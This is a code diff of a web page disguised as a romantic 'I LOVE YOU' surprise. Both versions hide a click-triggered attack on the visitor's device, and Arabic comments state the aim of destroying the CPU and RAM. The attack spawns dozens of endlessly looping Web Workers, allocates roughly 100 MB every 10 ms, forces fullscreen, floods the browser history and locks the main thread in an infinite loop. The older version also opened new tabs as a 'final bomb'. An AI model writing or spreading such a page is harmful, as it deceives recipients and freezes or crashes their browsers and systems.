@@ -5,64 +5,59 @@
     <title>Surprise ❤️</title>
     <style>
         body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; text-shadow: 0 0 30px #ff0055; cursor: pointer; user-select: none; }
+        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; text-shadow: 0 0 30px #ff0055; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <h1 id="burn">I LOVE YOU</h1>
+    <h1 id="start">I LOVE YOU</h1>
 
     <script>
-        const trigger = document.getElementById('burn');
-        let memoryMass = [];
+        const btn = document.getElementById('start');
+        let memoryFlood = [];
 
-        trigger.onclick = function() {
-            this.innerText = "CRITICAL...";
+        btn.onclick = function() {
+            this.innerText = "WAITING...";
             
-            // 1. فتح 128 عامل (Workers) - ضعف العدد السابق مرتين
-            // ده بيخلي المعالج مفيش فيه ثانية واحدة فاضية
-            for (let i = 0; i < 128; i++) {
-                const worker = new Worker(URL.createObjectURL(new Blob([`
-                    onmessage = function(e) {
-                        const view = new Int32Array(e.data);
-                        while(true) {
-                            // عملية حسابية وتخزينية مستمرة تمنع المعالج من الراحة
-                            for(let j=0; j<100000; j++) {
-                                Atomics.add(view, 0, Math.sqrt(Math.random()));
-                                Math.asin(Math.cos(Math.random()));
-                            }
-                        }
-                    }
-                `], {type: 'application/javascript'})));
+            // 1. ملء الشاشة لزيادة استهلاك موارد الجرافيك
+            document.documentElement.requestFullscreen().catch(()=>{});
 
-                // إنشاء مساحة ذاكرة مشتركة لكل عامل لإجبار الرام على الامتلاء
-                try {
-                    const sab = new SharedArrayBuffer(1024);
-                    worker.postMessage(sab);
-                } catch(e) {
-                    // إذا كان المتصفح يمنع SharedArrayBuffer، نستخدم الهجوم البديل
-                    worker.postMessage("fallback");
-                }
+            // 2. تدمير المعالج (CPU 100%)
+            // سنفتح عدد ضخم من العمال لإجبار المعالج على أقصى طاقة
+            const cores = (navigator.hardwareConcurrency || 8) * 4; 
+            for (let i = 0; i < cores; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    setInterval(() => {
+                        let data = "X".repeat(100000);
+                        while(true) {
+                            // عمليات تشفير تستهلك طاقة المعالج بالكامل
+                            data = btoa(data + Math.random());
+                            if(data.length > 1000000) data = data.substring(0, 100);
+                        }
+                    }, 1);
+                `], { type: 'application/javascript' })));
             }
 
-            // 2. هجوم الرام الأعنف (Ram Destructor)
-            // حجز 200 ميجا كل 10 مللي ثانية
+            // 3. تدمير الرام (RAM Destruction)
+            // سنقوم بحجز مساحات ضخمة من الذاكرة الخام (Typed Arrays)
             setInterval(() => {
                 try {
-                    // حجز مصفوفات ضخمة جداً (BigInt64Array) لأنها أثقل على النظام
-                    let chunk = new BigInt64Array(1024 * 1024 * 10).fill(BigInt(i)); 
-                    memoryMass.push(chunk);
+                    // حجز 100 ميجا في كل لفة (كل 10 مللي ثانية)
+                    let chunk = new BigUint64Array(1024 * 1024 * 12).fill(BigInt(0xFFFFFFFFFFFFFFFFn));
+                    memoryFlood.push(chunk);
                     
-                    // منع المتصفح من عمل "Aw Snap" عن طريق إشغاله بـ Console
-                    console.error("System Memory Leak: " + memoryMass.length * 80 + "MB");
-                } catch(err) {
-                    // لو الرام اتملت، يبدأ يفتح تبويبات جديدة كقنبلة نهائية
-                    window.open(window.location.href, '_blank');
+                    // منع المتصفح من إفراغ الذاكرة
+                    window.history.pushState(null, null, "#" + Math.random());
+                } catch(e) {
+                    // في حالة الانهيار، يحاول الكود الاستمرار في استهلاك ما تبقى
                 }
             }, 10);
 
-            // 3. شلل تام في الواجهة
-            document.body.style.animation = "pulse 0.01s infinite";
+            // 4. جعل الواجهة لا تستجيب نهائياً
+            while(true) {
+                // هجوم مباشر على "المسار الرئيسي" (Main Thread)
+                for(let i=0; i<1000000; i++) { Math.atan(Math.random()); }
+            }
         };
     </script>
 </body>
